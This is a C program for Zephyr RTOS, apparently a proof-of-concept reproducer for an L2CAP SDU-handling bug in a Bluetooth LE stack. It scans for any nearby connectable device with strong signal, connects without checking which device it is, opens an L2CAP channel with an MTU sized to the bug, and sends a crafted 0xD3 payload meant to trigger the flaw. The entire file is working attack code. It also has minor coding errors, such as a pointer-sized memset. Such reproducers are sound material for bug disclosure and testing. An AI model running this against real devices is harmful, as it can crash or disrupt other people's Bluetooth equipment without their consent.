/* main.c - Application main entry point */

/*
 * Copyright (c) 2015-2016 Intel Corporation
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <zephyr/types.h>
#include <stddef.h>
#include <errno.h>
#include <zephyr.h>
#include <sys/printk.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/conn.h>
#include <bluetooth/uuid.h>
#include <bluetooth/gatt.h>
#include <bluetooth/l2cap.h>
#include <sys/byteorder.h>

/* Two different ways to trigger the bug */
#define TRIGGER_SDU_BUG 0
#define TRIGGER_SDU_BUG_AGAIN 1

#define HOST_L2CAP_NETBUF_COUNT 5
#define HOST_MAX_L2CAP_CHANNELS 4

#define MAX_L2CAP_DATA_LEN 128

#if TRIGGER_SDU_BUG
#define L2CAP_SPAM_DATA_LEN 80
#elif TRIGGER_SDU_BUG_AGAIN
#define L2CAP_SPAM_DATA_LEN 27
#else
#define L2CAP_SPAM_DATA_LEN 50
#endif

#define L2CAP_RX_MTU (L2CAP_SPAM_DATA_LEN + 4)

static uint8_t l2cap_data[L2CAP_SPAM_DATA_LEN] = {0xD3};

bool periph_connected = 0;
bool l2cap_chan_connected = 0;
uint32_t l2cap_handle = 0;

#if TRIGGER_SDU_BUG_AGAIN
NET_BUF_POOL_DEFINE(l2cap_pool, HOST_L2CAP_NETBUF_COUNT,
		    BT_L2CAP_BUF_SIZE(L2CAP_SPAM_DATA_LEN), 0, NULL);
#else
NET_BUF_POOL_DEFINE(l2cap_pool, HOST_L2CAP_NETBUF_COUNT,
		    BT_L2CAP_BUF_SIZE(MAX_L2CAP_DATA_LEN), 0, NULL);
#endif

static struct bt_l2cap_le_chan l2cap_channels[HOST_MAX_L2CAP_CHANNELS];

#if !(TRIGGER_SDU_BUG || TRIGGER_SDU_BUG_AGAIN)
static struct net_buf *l2cap_chan_alloc_buf_cb(struct bt_l2cap_chan *chan);
#endif
static void l2cap_chan_connected_cb(struct bt_l2cap_chan *chan);
static void l2cap_chan_status_cb(struct bt_l2cap_chan *chan, atomic_t *status);
static int l2cap_chan_recv_cb(struct bt_l2cap_chan *chan, struct net_buf *buf);
static void l2cap_chan_sent_cb(struct bt_l2cap_chan *chan);

static struct bt_l2cap_chan_ops l2cap_chan_ops = {
#if !(TRIGGER_SDU_BUG || TRIGGER_SDU_BUG_AGAIN)
	.alloc_buf = l2cap_chan_alloc_buf_cb,
#endif
	.connected = l2cap_chan_connected_cb,
	.status = l2cap_chan_status_cb,
	.recv = l2cap_chan_recv_cb,
	.sent = l2cap_chan_sent_cb
};

static int l2cap_chan_recv_cb(struct bt_l2cap_chan *chan, struct net_buf *buf)
{
	printk("%s\n", __func__);
	return 0;
}

static void l2cap_chan_sent_cb(struct bt_l2cap_chan *chan)
{
	printk("%s\n", __func__);
}

#if (TRIGGER_SDU_BUG || TRIGGER_SDU_BUG_AGAIN)
static struct net_buf *l2cap_chan_alloc_buf_cb(struct bt_l2cap_chan *chan)
{
	return net_buf_alloc(&l2cap_pool, K_NO_WAIT);
}
#endif

static void l2cap_chan_status_cb(struct bt_l2cap_chan *chan, atomic_t *status)
{
	return;
}

static void l2cap_chan_connected_cb(struct bt_l2cap_chan *l2cap_chan)
{
	l2cap_chan_connected = 1;
}

static struct bt_l2cap_le_chan *get_free_l2cap_le_chan(void)
{
	for (int i = 0; i < HOST_MAX_L2CAP_CHANNELS; i++) {
		struct bt_l2cap_le_chan *le_chan = &l2cap_channels[i];
		printk("%s enter loop\n", __func__);

		if (le_chan->chan.status != BT_L2CAP_DISCONNECTED) {
			printk("%s chan status: %ls\n", __func__, le_chan->chan.status );
			continue;
		}

		printk("%s memset\n", __func__);
		memset(le_chan, 0, sizeof(le_chan));
		return le_chan;
	}

	printk("%s return null\n", __func__);
	return NULL;
}

static int l2cap_server_accept_cb(struct bt_conn *conn,
				  struct bt_l2cap_chan **chan)
{
	struct bt_l2cap_le_chan *le_chan = get_free_l2cap_le_chan();

	if (le_chan == NULL) {
		return -ENOMEM;
	}

	memset(le_chan, 0, sizeof(*le_chan));
	le_chan->chan.ops = &l2cap_chan_ops;
	le_chan->rx.mtu = MAX_L2CAP_DATA_LEN;
	*chan = &le_chan->chan;

	return 0;
}

static struct bt_l2cap_server l2cap_server = { .accept = l2cap_server_accept_cb };

int test_bt_l2cap_server_register(uint16_t psm, bt_security_t sec_level)
{
	l2cap_server.psm = psm;
	l2cap_server.sec_level = sec_level;

	return bt_l2cap_server_register(&l2cap_server);
}

uint16_t test_bt_l2cap_server_get_psm(void)
{
	return l2cap_server.psm;
}

int test_bt_l2cap_chan_connect(struct bt_conn* conn, uint16_t psm,
			       uint16_t rx_mtu)
{
	l2cap_handle = 0;

	/* struct bt_l2cap_le_chan *le_chan = get_free_l2cap_le_chan(); */
	struct bt_l2cap_le_chan *le_chan = &l2cap_channels[0];

	if (le_chan == NULL) {
		return -ENOMEM;
	}

	le_chan->chan.ops = &l2cap_chan_ops;
	le_chan->rx.mtu = rx_mtu;

	int ret = bt_l2cap_chan_connect(conn, &le_chan->chan, psm);

	if (ret == 0) {
		l2cap_handle = (uint32_t)&le_chan->chan;
	}

	return ret;
}

int test_bt_l2cap_chan_disconnect(uint32_t l2cap_handle)
{
	struct bt_l2cap_chan *chan = (struct bt_l2cap_chan *)l2cap_handle;

	return bt_l2cap_chan_disconnect(chan);
}

int test_bt_l2cap_chan_send(uint32_t l2cap_handle)
{
	struct bt_l2cap_chan *chan = (struct bt_l2cap_chan *)l2cap_handle;

	struct net_buf *buf = net_buf_alloc(&l2cap_pool, K_NO_WAIT);
	if (buf == NULL) {
		return -ENOMEM;
	}

	net_buf_add_mem(buf, l2cap_data, L2CAP_SPAM_DATA_LEN);

	int ret = bt_l2cap_chan_send(chan, buf);

	if (ret < 0) {
		net_buf_unref(buf);
	}

	return ret;
}

static void start_scan(void);

static struct bt_conn *default_conn;

static void device_found(const bt_addr_le_t *addr, int8_t rssi, uint8_t type,
			 struct net_buf_simple *ad)
{
	char addr_str[BT_ADDR_LE_STR_LEN];
	int err;

	if (default_conn) {
		return;
	}

	/* We're only interested in connectable events */
	if (type != BT_GAP_ADV_TYPE_ADV_IND &&
	    type != BT_GAP_ADV_TYPE_ADV_DIRECT_IND) {
		return;
	}

	bt_addr_le_to_str(addr, addr_str, sizeof(addr_str));
	/* printk("Device found: %s (RSSI %d)\n", addr_str, rssi); */

	/* connect only to devices in close proximity */
	if (rssi < -50) {
		return;
	}

	if (bt_le_scan_stop()) {
		return;
	}

	err = bt_conn_le_create(addr, BT_CONN_LE_CREATE_CONN,
				BT_LE_CONN_PARAM_DEFAULT, &default_conn);
	if (err) {
		printk("Create conn to %s failed (%u)\n", addr_str, err);
		start_scan();
	}
}

static void start_scan(void)
{
	int err;

	/* This demo doesn't require active scan */
	err = bt_le_scan_start(BT_LE_SCAN_PASSIVE, device_found);
	if (err) {
		printk("Scanning failed to start (err %d)\n", err);
		return;
	}

	printk("Scanning successfully started\n");
}

static void connected(struct bt_conn *conn, uint8_t err)
{
	char addr[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));

	if (err) {
		printk("Failed to connect to %s (%u)\n", addr, err);

		bt_conn_unref(default_conn);
		default_conn = NULL;

		start_scan();
		return;
	}

	if (conn != default_conn) {
		return;
	}

	printk("Connected: %s\n", addr);

	periph_connected = 1;
}

static void disconnected(struct bt_conn *conn, uint8_t reason)
{
	char addr[BT_ADDR_LE_STR_LEN];

	if (conn != default_conn) {
		return;
	}

	bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));

	printk("Disconnected: %s (reason 0x%02x)\n", addr, reason);

	bt_conn_unref(default_conn);
	default_conn = NULL;

	start_scan();
}

static struct bt_conn_cb conn_callbacks = {
		.connected = connected,
		.disconnected = disconnected,
};

void main(void)
{
	int err;

	/* Clear channel array */
	for(int i=0; i<HOST_MAX_L2CAP_CHANNELS; i++)
		memset(&l2cap_channels[i], 0, sizeof(l2cap_channels[i]));

	err = bt_enable(NULL);
	if (err) {
		printk("Bluetooth init failed (err %d)\n", err);
		return;
	}

	printk("Bluetooth initialized\n");

	bt_conn_cb_register(&conn_callbacks);

	start_scan();

	printk("Start wait...\n");
	while(!periph_connected)
	{
		k_msleep(1000);
		printk("Waiting for connection...\n");
	}

	printk("Starting L2CAP test\n");
	k_msleep(2000);

	printk("Connecting L2CAP channel\n");
	int error = test_bt_l2cap_chan_connect(default_conn, 0x80, L2CAP_RX_MTU);
	if(error != 0)
		printk("chan_connect error %d\n", error);

	while(!l2cap_chan_connected)
	{
		k_msleep(1000);
		printk("Waiting for l2cap channel connection...\n");
	}

	printk("Sending payload\n");
	error = test_bt_l2cap_chan_send(l2cap_handle);
	if(error != 0)
	{
		printk("chan_send error %d\n", error);
	}

	while(1)
	{
		k_msleep(1000);
	}

	printk("Disconnecting\n");
	bt_conn_disconnect(default_conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
}
